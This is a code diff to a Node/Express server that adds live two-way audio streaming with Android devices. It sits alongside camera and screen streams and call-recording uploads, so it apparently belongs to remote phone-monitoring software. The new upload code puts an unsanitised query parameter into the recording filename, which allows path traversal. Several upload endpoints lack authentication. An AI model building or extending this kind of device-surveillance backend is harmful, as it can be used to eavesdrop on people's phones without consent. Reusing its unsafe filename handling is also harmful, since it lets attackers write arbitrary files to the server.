@@ -13,6 +13,8 @@ const DB_FILE = path.join(__dirname, '..', 'db.json');
 // Active MJPEG stream connections
 const cameraStreams = {};
 const screenStreams = {};
+const audioStreams = {};
+const deviceAudioStreams = {};
 
 // Middleware
 app.use(cors());
@@ -36,6 +38,8 @@ app.use('/uploads', express.static(UPLOADS_DIR, {
   setHeaders: (res, filePath) => {
     if (filePath.endsWith('.m4a') || filePath.endsWith('.mp4')) {
       res.setHeader('Content-Type', 'audio/mp4');
+    } else if (filePath.endsWith('.wav')) {
+      res.setHeader('Content-Type', 'audio/wav');
     }
   }
 }));
@@ -684,7 +688,8 @@ app.post('/api/recordings/upload', express.raw({ type: '*/*', limit: '50mb' }), 
   const safeEmail = normalizedEmail.replace(/[^a-z0-9]/g, '_');
   const safeTime = time.replace(/[^a-z0-9]/gi, '_');
   const safeNumber = callerNumber.replace(/[^a-z0-9+]/gi, '_');
-  const filename = `${safeEmail}_${safeTime}_${safeNumber}.m4a`;
+  const ext = req.query.ext || 'm4a';
+  const filename = `${safeEmail}_${safeTime}_${safeNumber}.${ext}`;
   const filePath = path.join(RECORDINGS_DIR, filename);
 
   try {
@@ -719,6 +724,91 @@ app.post('/api/recordings/upload', express.raw({ type: '*/*', limit: '50mb' }), 
     console.error('Failed to save uploaded call recording:', err);
     res.status(500).json({ success: false, error: 'Failed to save recording file' });
   }
+});
+
+// A. Post Android audio chunk to Web clients
+app.post('/api/audio/upload', express.raw({ type: '*/*', limit: '1mb' }), (req, res) => {
+  const { email } = req.query;
+  if (!email) return res.status(400).json({ success: false });
+
+  const normalizedEmail = email.toLowerCase().trim();
+  const clients = audioStreams[normalizedEmail];
+  if (clients && clients.length > 0) {
+    clients.forEach(clientRes => {
+      try {
+        clientRes.write(req.body);
+      } catch (err) {
+        // Safe stream write error handling
+      }
+    });
+  }
+  res.json({ success: true });
+});
+
+// B. Web client streams live audio from Android
+app.get('/api/audio/stream', (req, res) => {
+  const { email, token } = req.query;
+  if (!email || token !== ADMIN_TOKEN) {
+    return res.status(403).send('Forbidden');
+  }
+
+  const normalizedEmail = email.toLowerCase().trim();
+  res.writeHead(200, {
+    'Content-Type': 'audio/l16;rate=16000;channels=1',
+    'Cache-Control': 'no-cache',
+    'Connection': 'keep-alive',
+    'Pragma': 'no-cache'
+  });
+
+  if (!audioStreams[normalizedEmail]) {
+    audioStreams[normalizedEmail] = [];
+  }
+  audioStreams[normalizedEmail].push(res);
+  console.log(`🔊 Web client connected to live audio stream for ${normalizedEmail}`);
+
+  req.on('close', () => {
+    audioStreams[normalizedEmail] = audioStreams[normalizedEmail].filter(c => c !== res);
+  });
+});
+
+// C. Web client uploads audio chunk (Talk)
+app.post('/api/audio/upload-web', express.raw({ type: '*/*', limit: '1mb' }), (req, res) => {
+  const { email } = req.query;
+  if (!email) return res.status(400).json({ success: false });
+
+  const normalizedEmail = email.toLowerCase().trim();
+  const deviceRes = deviceAudioStreams[normalizedEmail];
+  if (deviceRes) {
+    try {
+      deviceRes.write(req.body);
+    } catch (err) {
+      // Safe stream write error handling
+    }
+  }
+  res.json({ success: true });
+});
+
+// D. Android app streams live audio from Web client
+app.get('/api/audio/device-stream', (req, res) => {
+  const { email } = req.query;
+  if (!email) return res.status(400).send('Email required');
+
+  const normalizedEmail = email.toLowerCase().trim();
+  res.writeHead(200, {
+    'Content-Type': 'application/octet-stream',
+    'Cache-Control': 'no-cache',
+    'Connection': 'keep-alive',
+    'Pragma': 'no-cache'
+  });
+
+  deviceAudioStreams[normalizedEmail] = res;
+  console.log(`📱 Device connected to web audio stream for ${normalizedEmail}`);
+
+  req.on('close', () => {
+    if (deviceAudioStreams[normalizedEmail] === res) {
+      delete deviceAudioStreams[normalizedEmail];
+    }
+  });
 });
 
 // Fetch call recordings for specific email
